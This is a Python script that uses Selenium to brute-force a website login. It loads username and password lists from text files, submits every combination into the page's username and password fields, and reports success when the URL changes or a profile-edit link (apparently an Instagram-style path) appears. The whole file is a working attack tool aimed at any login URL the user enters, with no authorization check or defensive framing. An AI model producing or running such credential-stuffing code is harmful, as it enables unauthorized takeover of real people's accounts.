from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Function to load usernames from the file
def load_usernames(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            usernames = file.read().splitlines()
        return usernames
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

# Function to load passwords from the file
def load_passwords(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            passwords = file.read().splitlines()
        return passwords
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

# Function to detect login form and perform brute force attack
def brute_force_login(url):
    # Load usernames and passwords
    usernames = load_usernames('usernames.txt')
    passwords = load_passwords('passwords.txt')
    
    if not usernames or not passwords:
        print("Usernames or passwords file is empty. Exiting.")
        return

    # Initialize the WebDriver
    driver = webdriver.Chrome()  # Use webdriver.Firefox() if needed
    
    try:
        driver.get(url)
        print(f"Opened login page: {url}")

        # Wait for the username and password fields to be available
        username_field = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.NAME, "username"))
        )
        password_field = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.NAME, "password"))
        )

        # Start the brute force attack by iterating over usernames and passwords
        for username in usernames:
            for password in passwords:
                print(f"Attempting login with username: {username} and password: {password}")

                try:
                    # Clear fields before every attempt to ensure no leftover values
                    username_field = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable((By.NAME, "username"))
                    )
                    password_field = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable((By.NAME, "password"))
                    )
                    username_field.clear()  # Clear the username field
                    password_field.clear()  # Clear the password field

                    # Fill the form fields with the credentials
                    username_field.send_keys(username)
                    password_field.send_keys(password)
                    password_field.send_keys(Keys.RETURN)  # Simulate pressing Enter key
                    
                    time.sleep(5)  # Wait for the page to load

                    # Check if login is successful by looking for a change in URL
                    # If the current URL isn't the same as the login page, login might have succeeded
                    if driver.current_url != url and "login" not in driver.current_url:
                        print("Brute force successful!")
                        return
                    # Alternatively, check if a profile icon or specific element appears
                    try:
                        # Check for a profile icon as a sign of successful login
                        profile_icon = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.XPATH, '//a[@href="/accounts/edit/"]'))
                        )
                        print("Brute force successful! (Profile found)")
                        return
                    except:
                        print(f"Failed login attempt with username: {username} and password: {password}")

                except Exception as e:
                    print(f"Error during login attempt: {e}")
                    continue

        print("Brute force failed. No valid credentials found.")

    finally:
        time.sleep(2)
        driver.quit()

# Main function
if __name__ == "__main__":
    login_url = input("Enter the URL of the login page: ").strip()
    brute_force_login(login_url)
